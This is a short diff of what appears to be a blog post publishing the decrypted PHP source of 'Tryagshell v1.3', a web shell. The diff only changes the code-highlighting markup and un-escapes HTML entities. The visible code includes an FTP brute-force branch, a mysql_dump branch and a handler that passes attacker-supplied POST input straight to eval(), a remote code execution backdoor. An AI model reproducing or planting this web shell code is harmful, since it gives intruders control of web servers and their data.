@@ -18,7 +18,7 @@ You can see the encrypted version here: [Tryagshell (encrypted)][1]
 
 ### Tryagshell v1.3 (decrypted) Source Code
 
-<pre class="brush: php; title: ; notranslate" title="">&lt;?php
+{% highlight php %}<?php
 /******************************************************************************************************/
 /*
 /*                                     #    #        #    #
@@ -2057,8 +2057,8 @@ if ($_POST['cmd']=="ftp_brute")
  echo $lang[$language.'_text98'].$suc."\r\n";
  }
 if ($_POST['cmd']=="php_eval"){
- $eval = @str_replace("&lt;?","",$_POST['php_eval']);
- $eval = @str_replace("?&gt;","",$eval);
+ $eval = @str_replace("<?","",$_POST['php_eval']);
+ $eval = @str_replace("?>","",$eval);
  @eval($eval);}
 if ($_POST['cmd']=="mysql_dump")
  {
@@ -2346,8 +2346,8 @@ die("&lt;FONT COLOR=\"RED\"&gt;&lt;CENTER&gt;Sorry... File
 &lt;B&gt;".htmlspecialchars($u1p)."&lt;/B&gt; dosen't exists or you don't have
 access.&lt;/CENTER&gt;&lt;/FONT&gt;");
 }
-?&gt;
-</pre>
+?>
+{% endhighlight %}
 
 ### Tryagshell v1.3 screenshot
 
